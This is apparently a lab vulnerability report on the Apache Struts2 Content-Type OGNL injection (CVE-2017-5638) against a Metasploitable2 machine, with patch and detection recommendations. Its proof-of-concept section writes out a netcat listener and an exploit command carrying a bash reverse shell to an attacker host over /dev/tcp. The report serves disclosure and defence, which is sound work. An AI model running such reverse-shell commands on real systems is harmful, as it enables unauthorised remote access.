# Apache Struts2 RCE Exploitation Report (CVE-2017-5638)

## Vulnerability Report: Apache Struts2 Content-Type OGNL Injection (CVE-2017-5638)

* **Severity**: Critical
* **Tool Used**: Manual Python PoC Script, Burp Suite
* **CVE**: CVE-2017-5638

---

## Impact

This vulnerability allows remote attackers to execute arbitrary commands on a system running a vulnerable version of Apache Struts2. The issue is due to improper handling of the `Content-Type` header, allowing OGNL expression injection.

If exploited, this can lead to full remote code execution and potentially complete system compromise.

---

## Proof of Concept

### Target

* **Victim Machine (Metasploitable2)**: `192.168.x.x`
* **Attacker Machine (Kali Linux)**: `192.168.x.x`

### Exploit Script

A Python proof-of-concept script was used to inject commands via a malicious `Content-Type` header.

```bash
python3 struts2_rce.py http://<viticm_IP>:8080/struts2-showcase/index.action "id"
```

### Reverse Shell

A reverse shell was triggered using:

```bash
# Attacker
nc -lvnp 4444

# Exploit Command
python3 struts2_rce.py http://<viticm_ip>:8080/struts2-showcase/index.action "bash -i >& /dev/tcp/<attacker_IP>/4444 0>&1"
```

---

## Recommendation

* Upgrade to a patched version of Apache Struts2 (>= 2.3.32 or 2.5.10.1)
* Use a WAF or IDS/IPS to block malicious payloads
* Sanitize and validate HTTP headers
* Perform regular vulnerability scanning and patch management

---

## Supporting Screenshots

1. Screenshot of PoC execution with command output
2. Screenshot of netcat listener receiving reverse shell
3. Screenshot of shell access to victim system

---

## Detection Notes (SIEM or Netcat Monitoring)

* Monitor HTTP traffic with suspicious `Content-Type` headers
* Alert on outgoing traffic to uncommon ports (like 4444)
* Track bash or cmd processes spawned by Java-related services
